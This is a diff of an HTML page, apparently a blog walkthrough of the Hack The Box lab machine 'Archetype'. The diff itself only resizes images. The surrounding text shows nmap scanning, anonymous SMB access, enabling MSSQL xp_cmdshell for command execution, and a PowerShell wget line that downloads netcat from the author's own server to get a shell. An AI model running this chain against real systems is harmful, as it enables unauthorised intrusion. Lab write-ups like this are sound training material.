@@ -28,7 +28,7 @@
     <h2>Information Gathering</h2>
     <p>First I started with a basic Nmap scan to identify open ports and services. This scan revealed services running on ports 135, 139, 445, 1433, and 5985. Out of those ports, I started with 445 to check SMB.</p>
     <pre><code>$ nmap -sV -sC 10.129.204.164</code></pre>
-    <img src="/images/htb/very-easy/archetype/archetype_nmap.png" alt="Archetype nmap results">
+    <img src="/images/htb/very-easy/archetype/archetype_nmap.png" alt="Archetype nmap results" style="width: 80%; height: auto;">
       
     <h2>Vulnerability Assessment</h2>
       <p>Similar to previous boxes, I logged into SMB without a password using <code>-N</code>. This along with <code>-L</code> listed all the shares available on the service.</p>
@@ -44,7 +44,7 @@
     <img src="/images/htb/very-easy/archetype/archetype_mssql_login.png" alt="Archetype mssql access">
     <p>I didn't know much about MSSQL, so I used the <code>help</code> command and found an option to enable a shell within the service.</p>
     <pre><code>SQL (ARCHETYPE\sql_svc db0@master)> enable_xp_cmdshell<br>SQL (ARCHETYPE\sql_svc db0@master)> RECONFIGURE<br>SQL (ARCHETYPE\sql_svc db0@master)> EXEC xp_cmdshell 'whoami';</code></pre>
-    <img src="/images/htb/very-easy/archetype/archetype_mssql_rce.png" alt="Archetype mssql rce">
+    <img src="/images/htb/very-easy/archetype/archetype_mssql_rce.png" alt="Archetype mssql rce" style="width: 80%; height: auto;">
     <p>Remote code execution allows for a more stable shell by transfering netcat over to the host machine from a webserver hosted by me. Once I sent the command, the PHP webserver receives the request for netcat and downloads it.</p>
     <pre><code>SQL (ARCHETYPE\sql_svc db0@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.186/nc64.exe -outfile nc64.exe"</code></pre>
     <img src="/images/htb/very-easy/archetype/archetype_mssql_nc.png" alt="Archetype mssql netcat">
